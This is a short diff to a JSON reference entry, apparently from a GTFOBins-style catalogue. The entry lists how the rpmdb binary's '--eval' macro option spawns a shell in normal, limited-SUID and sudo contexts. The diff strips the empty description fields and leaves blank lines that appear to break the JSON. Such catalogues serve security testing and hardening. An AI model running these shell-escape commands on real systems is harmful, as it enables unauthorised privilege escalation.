@@ -2,19 +2,19 @@
   "functions": {
     "shell": [
       {
-        "description": "",
+        
         "code": "rpmdb --eval '%(/bin/sh 1>&2)'\n"
       }
     ],
     "limited-suid": [
       {
-        "description": "",
+        
         "code": "./rpmdb --eval '%(/bin/sh 1>&2)'\n"
       }
     ],
     "sudo": [
       {
-        "description": "",
+        
         "code": "sudo rpmdb --eval '%(/bin/sh 1>&2)'\n"
       }
     ]
